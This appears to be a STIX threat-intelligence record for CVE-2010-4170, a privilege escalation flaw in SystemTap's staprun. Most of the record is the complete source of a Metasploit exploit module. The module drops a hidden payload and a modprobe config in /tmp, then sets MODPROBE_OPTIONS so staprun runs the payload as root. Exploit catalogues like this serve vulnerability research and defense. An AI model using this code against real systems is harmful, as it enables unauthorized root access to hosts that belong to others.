{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16b93616-998c-4fb6-bd0d-0dd6ed6b0c37",
    "created": "2024-08-14T16:58:55.276673Z",
    "modified": "2024-08-14T16:58:55.276677Z",
    "name": "SystemTap MODPROBE_OPTIONS Privilege Escalation",
    "description": " This module attempts to gain root privileges by exploiting a vulnerability in the `staprun` executable included with SystemTap version 1.3.  The `staprun` executable does not clear environment variables prior to executing `modprobe`, allowing an arbitrary configuration file to be specified in the `MODPROBE_OPTIONS` environment variable, resulting in arbitrary command execution with root privileges.  This module has been tested successfully on:  systemtap 1.2-1.fc13-i686 on Fedora 13 (i686); and systemtap 1.1-3.el5 on RHEL 5.5 (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/systemtap_modprobe_options_priv_esc.rb",
            "external_id": "systemtap_modprobe_options_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4170"
        },
        {
            "source_name": "reference",
            "url": "https://securitytracker.com/id?1024754"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/cve-2010-4170"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=653604"
        },
        {
            "source_name": "reference",
            "url": "https://lists.fedoraproject.org/pipermail/package-announce/2010-November/051115.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.launchpad.net/bugs/677226"
        },
        {
            "source_name": "reference",
            "url": "https://www.debian.org/security/2011/dsa-2348"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SystemTap MODPROBE_OPTIONS Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges by exploiting a\n          vulnerability in the `staprun` executable included with SystemTap\n          version 1.3.\n\n          The `staprun` executable does not clear environment variables prior to\n          executing `modprobe`, allowing an arbitrary configuration file to be\n          specified in the `MODPROBE_OPTIONS` environment variable, resulting\n          in arbitrary command execution with root privileges.\n\n          This module has been tested successfully on:\n\n          systemtap 1.2-1.fc13-i686 on Fedora 13 (i686); and\n          systemtap 1.1-3.el5 on RHEL 5.5 (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Tavis Ormandy', # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2010-11-17',\n        'References' => [\n          ['BID', '44914'],\n          ['CVE', '2010-4170'],\n          ['EDB', '15620'],\n          ['URL', 'https://securitytracker.com/id?1024754'],\n          ['URL', 'https://access.redhat.com/security/cve/cve-2010-4170'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=653604'],\n          ['URL', 'https://lists.fedoraproject.org/pipermail/package-announce/2010-November/051115.html'],\n          ['URL', 'https://bugs.launchpad.net/bugs/677226'],\n          ['URL', 'https://www.debian.org/security/2011/dsa-2348']\n        ],\n        'Platform' => ['linux'],\n        'Arch' => [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [['Auto', {}]],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options [\n      OptString.new('STAPRUN_PATH', [true, 'Path to staprun executable', '/usr/bin/staprun'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def staprun_path\n    datastore['STAPRUN_PATH']\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def check\n    return CheckCode::Safe(\"#{staprun_path} file not found\") unless file? staprun_path\n\n    # On some systems, staprun execution is restricted to stapusr group:\n    # ---s--x---. 1 root stapusr 178488 Mar 28  2014 /usr/bin/staprun\n    return CheckCode::Safe(\"#{staprun_path} is not executable\") unless executable?(staprun_path)\n\n    vprint_good \"#{staprun_path} is executable\"\n\n    return CheckCode::Safe(\"#{staprun_path} is not setuid\") unless setuid? staprun_path\n\n    vprint_good \"#{staprun_path} is setuid\"\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    payload_name = \".#{rand_text_alphanumeric 10..15}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    config_path = \"#{base_dir}/#{payload_name}.conf\"\n    upload config_path, 'install uprobes /bin/sh'\n\n    print_status 'Executing payload...'\n    res = cmd_exec \"echo '#{payload_path}&' | MODPROBE_OPTIONS='-C #{config_path}' #{staprun_path} -u #{rand_text_alphanumeric 10..15}\"\n    vprint_line res\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-17",
    "x_mitre_platforms": [
        "['linux']"
    ]
}